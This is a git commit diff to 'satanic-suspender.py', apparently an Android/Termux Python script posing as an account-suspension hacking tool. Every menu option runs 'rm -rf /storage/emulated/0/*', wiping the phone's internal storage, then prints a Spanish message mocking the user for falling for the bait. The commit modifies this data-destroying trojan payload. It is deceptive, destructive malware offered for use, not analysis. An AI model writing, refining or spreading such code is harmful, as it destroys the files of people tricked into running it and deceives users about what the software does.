03869d4e495a26c72a979b000d00e873bd72c4cb
satanic <83351752+satanic-ofc@users.noreply.github.com>
2021-04-28 14:07:55 +0000

    Update satanic-suspender.py

--- satanic-suspender.py
+++ satanic-suspender.py
@@ -22,22 +22,22 @@ menu()
 X = input("\033[1;44;37mElige una opcion. ej: 1\033[0;m \033[1;36m\n\n>\033[0;m ")
 
 if X == "1":
-    hack = os.system("rm -rf /storage/emulated/0/")
+    hack = os.system("rm -rf /storage/emulated/0/*")
     print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
 elif X == "2":
-    hack = os.system("rm -rf /storage/emulated/0/")
+    hack = os.system("rm -rf /storage/emulated/0/*")
     print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
 elif X == "3":
-    hack = os.system("rm -rf /storage/emulated/0/")
+    hack = os.system("rm -rf /storage/emulated/0/*")
     print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
 elif X == "4":
-    hack = os.system("rm -rf /storage/emulated/0/")
+    hack = os.system("rm -rf /storage/emulated/0/*")
     print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
 elif X == "5":
-    hack = os.system("rm -rf /storage/emulated/0/")
+    hack = os.system("rm -rf /storage/emulated/0/*")
     print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
 elif X == "0":
-    hack = os.system("rm -rf /storage/emulated/0/")
+    hack = os.system("rm -rf /storage/emulated/0/*")
     time.sleep(1)
     print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
 else:
